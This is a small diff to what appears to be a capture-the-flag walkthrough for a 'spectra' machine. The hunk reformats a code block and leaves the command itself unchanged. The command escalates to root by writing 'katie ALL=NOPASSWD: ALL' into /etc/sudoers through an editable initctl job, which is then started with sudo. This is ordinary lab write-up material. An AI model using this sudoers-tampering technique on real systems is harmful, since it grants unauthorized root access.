@@ -68,8 +68,10 @@ Since I was at the 'developers' group, I could edit/write to all of those jobs, 
 of the jobs with ```sudo initctl list```, and I found that it matched the list. </br>
 To escalate my privileges I edited one of the jobs that I had access to (I chose test.conf file), and put
 this inside: </br>
-```echo 'chmod 777 /etc/sudoers && echo "katie ALL=NOPASSWD: ALL" >> /etc/sudoers
-&& chmod 440 /etc/sudoers' > /tmp/test.sh && bash /tmp/test.sh``` </br>
+```
+echo 'chmod 777 /etc/sudoers && echo "katie ALL=NOPASSWD: ALL" >> /etc/sudoers
+&& chmod 440 /etc/sudoers' > /tmp/test.sh && bash /tmp/test.sh
+``` </br>
 
 ![initctl_job_modify](images/spectra/initctl_job_modify.png) </br>
 I ran it with: ```sudo initctl start test``` And it worked. </br> </br>
